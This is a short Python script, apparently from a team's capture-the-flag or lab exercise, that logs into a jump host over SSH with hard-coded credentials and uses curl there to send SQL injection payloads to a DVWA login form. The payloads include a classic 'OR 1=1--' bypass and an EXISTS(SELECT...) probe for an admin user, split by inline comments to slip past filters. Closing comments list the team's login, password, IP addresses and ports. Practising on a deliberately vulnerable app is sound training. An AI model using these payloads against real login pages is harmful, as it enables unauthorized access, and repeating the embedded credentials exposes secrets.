import paramiko

# Название команды: ЧВК Сырочек

hostname = "203.81.208.25"
password = "#@~79j0gb2$a"
username = "team06"
port = 22006

address = "http://dvwa.local"


class SSHInterface:
    def __init__(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(hostname, port, username, password)

    def execute_command(self, request):
        command = f"""curl -i -d 'username={request}' -d 'password={request}' {address}"""

        stdin, stdout, stderr = self.client.exec_command(command)

        data = stdout.read().decode().split()

        if data:
            new_data = {
                "NUMBER_ERROR": data[1],
                "TEXT_ERROR": " ".join([data[0]] + data[2:]),
            }

            return new_data
        return {"NUMBER_ERROR": "None", "TEXT_ERROR": "None"}

    def close(self):
        self.client.close()


if __name__ == "__main__":
    ssh_interface = SSHInterface()

    print(ssh_interface.execute_command(r"""'OR 1=1--"""))
    print(ssh_interface.execute_command(r"""'OR EX/**/ISTS(SEL/**/ECT * FR/**/OM users WH/**/ERE username='admin')--"""))

    ssh_interface.close()

# Название команды: ЧВК Сырочек
# Логин:  team06
# Пароль: #@~79j0gb2$a
# Внутернний ip: 10.0.1.106
# Внешний ip: 203.81.208.25
# ssh: 22006
# rdp: 33006
# http://dvwa.local/
